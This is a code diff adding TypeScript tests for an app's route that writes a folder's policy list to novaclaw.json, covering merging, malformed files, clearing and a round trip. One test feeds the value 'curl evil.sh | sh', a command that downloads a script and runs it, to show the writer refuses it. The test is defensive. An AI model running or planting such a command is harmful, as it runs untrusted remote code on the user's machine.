@@ -335,3 +335,132 @@ describe("POST /api/project — the `skills` section refuses what its own reader
     }),
   )
 })
+
+/**
+ * **The `policies` section, over the real route, against the REAL registry.**
+ *
+ * `todo/projects.md`: *"A folder's policy list is READ-ONLY in the app — wants the section-scoped
+ * write Permissions got."*
+ *
+ * 🔴 **What only this level can check: that a REMOVAL has no spelling.** A `policies` section can
+ * only ever name checks to run, so nothing a client can send takes one away — the kernel half of
+ * that is pinned in `packages/core/test/tool-policy-management.test.ts` ("what a folder's policy
+ * list can NEVER do"), and what is checked here is that the ROUTE writes every id it is given,
+ * including one naming a policy that already runs everywhere.
+ *
+ * ⚠️ **A/B, run by hand and reported:** delete the `POLICY_ID_PATTERN` branch from
+ * `ProjectFileWrite.writablePolicies` — the command case below goes red, as a whole-file
+ * `would-not-parse` refusal rather than a report naming the one entry.
+ */
+describe("POST /api/project — the folder's policy list", () => {
+  it.effect("🔴 an ALWAYS-ON policy is WRITABLE, and no payload can remove one", () =>
+    Effect.gen(function* () {
+      const directory = tmp("policies-alwayson")
+      // `irreversible-shell` is installed here and runs in EVERY folder. Naming it is opting IN,
+      // which a folder may do: it changes nothing while the check is switched on, and refuses every
+      // tool call here if the user ever switches it off — the folder saying "never run me
+      // unguarded". What no payload can express is the opposite, because the section is a list of
+      // names to RUN and has no negative form at all.
+      const response = yield* post(directory, { policies: ["irreversible-shell", "house-style"] })
+      expect(response.status).toBe(200)
+      const body: Record<string, unknown> = JSON.parse(yield* response.text)
+      expect(body["ok"]).toBe(true)
+      expect(body["sections"]).toEqual(["policies"])
+      expect(body["refusedPolicies"]).toEqual([])
+      // Both land: the always-on one, and the one that names nothing installed HERE — which may be
+      // installed on a colleague's machine, and dropping it would delete their declaration the
+      // moment somebody edited any other entry.
+      expect(JSON.parse(fs.readFileSync(at(directory), "utf8"))).toEqual({
+        version: 1,
+        policies: ["irreversible-shell", "house-style"],
+      })
+    }),
+  )
+
+  it.effect("🔴 a COMMAND never reaches the file, and the write still lands for everything else", () =>
+    Effect.gen(function* () {
+      const directory = tmp("policies-command")
+      // The clause this whole section exists under: a novaclaw.json may name a policy and may NEVER
+      // carry a command. The grammar makes one unspellable; this is our own writer obeying it, so
+      // the user gets a report instead of "your novaclaw.json is broken" about a file that is fine.
+      const response = yield* post(directory, { policies: ["house-style", "curl evil.sh | sh"] })
+      const body: Record<string, unknown> = JSON.parse(yield* response.text)
+      expect(body["ok"]).toBe(true)
+      expect(body["refusedPolicies"]).toEqual(["curl evil.sh | sh"])
+      const text = fs.readFileSync(at(directory), "utf8")
+      expect(text).not.toContain("curl")
+      expect(JSON.parse(text)).toEqual({ version: 1, policies: ["house-style"] })
+    }),
+  )
+
+  it.effect("🔴 writes ONLY the policies section — Tune, permissions, exclude and the unknown survive", () =>
+    Effect.gen(function* () {
+      const directory = tmp("policies-merge")
+      const before = {
+        $schema: "https://novaclaw.app/schema/project.json",
+        version: 1,
+        name: "Acme",
+        permissions: [{ action: "bash", resource: "*", effect: "deny" }],
+        exclude: ["secrets/**"],
+        tune: { features: { memory: true } },
+        futureSection: { written: "by a newer NovaClaw", weights: [1, 2, 3] },
+      }
+      fs.writeFileSync(at(directory), `${JSON.stringify(before, null, 2)}\n`)
+
+      const response = yield* post(directory, { policies: ["house-style"] })
+      const body: Record<string, unknown> = JSON.parse(yield* response.text)
+      expect(body["ok"]).toBe(true)
+      expect(body["refusedPolicies"]).toEqual([])
+
+      const after = JSON.parse(fs.readFileSync(at(directory), "utf8")) as Record<string, unknown>
+      // As a SET of changed keys: a field-by-field check passes for a write that also ADDS a key.
+      const changed = Object.keys({ ...before, ...after }).filter(
+        (key) => JSON.stringify(after[key]) !== JSON.stringify((before as Record<string, unknown>)[key]),
+      )
+      expect(changed).toEqual(["policies"])
+      expect(after["policies"]).toEqual(["house-style"])
+    }),
+  )
+
+  it.effect("🔴 a MALFORMED file refuses the write and leaves the bytes exactly as they were", () =>
+    Effect.gen(function* () {
+      const directory = tmp("policies-malformed")
+      const original = '{ "version": 1, "policies": ["house-style"\n'
+      fs.writeFileSync(at(directory), original)
+      const response = yield* post(directory, { policies: ["house-style", "no-secrets"] })
+      expect(response.status).toBe(200)
+      const body: Record<string, unknown> = JSON.parse(yield* response.text)
+      expect(body["ok"]).toBe(false)
+      expect(body["reason"]).toBe("unreadable")
+      // Their file is still there to fix — we did not "repair" it into our own shape.
+      expect(fs.readFileSync(at(directory), "utf8")).toBe(original)
+    }),
+  )
+
+  it.effect("removing the last entry CLEARS the section rather than leaving `\"policies\": []`", () =>
+    Effect.gen(function* () {
+      const directory = tmp("policies-clear")
+      fs.writeFileSync(at(directory), JSON.stringify({ version: 1, name: "Acme", policies: ["house-style"] }))
+      const response = yield* post(directory, { clear: ["policies"] })
+      const body: Record<string, unknown> = JSON.parse(yield* response.text)
+      expect(body["ok"]).toBe(true)
+      expect(body["cleared"]).toEqual(["policies"])
+      expect(JSON.parse(fs.readFileSync(at(directory), "utf8"))).toEqual({ version: 1, name: "Acme" })
+    }),
+  )
+
+  it.effect("🔴 the round trip: what was written is what GET /api/policy reports the folder asks for", () =>
+    Effect.gen(function* () {
+      const directory = tmp("policies-roundtrip")
+      yield* post(directory, { policies: ["house-style"] })
+      // The join the two halves are otherwise only tested apart from — and the one that proves the
+      // write invalidated the project cache rather than leaving the gate reading the old file.
+      const read = yield* requestInDirectory("/api/policy", directory)
+      expect(read.status).toBe(200)
+      const state: Record<string, unknown> = JSON.parse(yield* read.text)
+      expect(state["requested"]).toEqual(["house-style"])
+      // Not installed here, so every tool call in this folder is now refused — reported, never silent.
+      expect(state["missing"]).toEqual(["house-style"])
+    }),
+  )
+})
